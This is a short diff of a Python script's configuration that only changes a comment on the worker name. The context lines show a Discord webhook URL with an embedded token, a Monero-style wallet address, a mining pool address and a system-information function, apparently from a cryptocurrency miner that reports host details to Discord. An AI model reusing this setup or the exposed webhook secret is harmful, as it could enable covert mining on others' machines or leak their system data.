@@ -8,7 +8,7 @@ import socket
 WEBHOOK = "https://discord.com/api/webhooks/1395138384518844508/riuLCmuUuVfVZECJE-zW75VwARH2p9jd8yP_Z1ndjP4gvNMH08Mf7C9PpXcITM-nmw8B"  # Discord Webhook URL
 WALLET = "ZEPHYR2zxTXUfUEtvhU5QSDjPPBq6XtoU8faeFj3mTEr5hWs5zERHsXT9xc6ivLNMmbbQvxWvGUaxAyyLv3Cnbb9MgemKUED19M2b"  # Monero Wallet Address
 POOL = "fr.zephyr.herominers.com:1123"  # Mining Pool URL
-WORKER_NAME = "worker001"  # Worker Name
+WORKER_NAME = "worker001"  # Worker Name (can be set to any name)
 
 # --- Script Logic ---
 def get_system_info():
